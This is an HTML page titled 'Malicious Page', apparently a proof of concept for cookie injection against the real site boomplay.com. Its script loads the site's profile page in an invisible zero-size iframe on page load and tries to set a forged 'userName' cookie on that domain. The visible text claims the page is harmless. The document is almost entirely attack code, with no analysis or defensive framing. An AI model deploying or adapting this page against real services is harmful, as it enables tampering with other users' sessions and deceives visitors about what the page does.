<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
    <script>
        // Ensure the script runs when the page is fully loaded
        window.onload = function() {
            // Create an iframe to load the target site
            let iframe = document.createElement('iframe');
            iframe.src = "https://boomplay.com/userCenter/profile";
            iframe.style.width = "0";
            iframe.style.height = "0";
            iframe.style.border = "none";
            document.body.appendChild(iframe);

            // Wait for the iframe to load before manipulating cookies
            iframe.onload = function() {
                try {
                    // Set a malicious cookie for the target site
                    iframe.contentWindow.document.cookie = "userName=hahaha; path=/; domain=boomplay.com";
                    console.log("Cookie injected successfully!");
                } catch (error) {
                    console.error("Failed to inject cookie: ", error);
                }
            };
        };
    </script>
</head>
<body>
    <h1>Welcome to My Site</h1>
    <p>This is just a harmless page, don't mind me!</p>
</body>
</html>
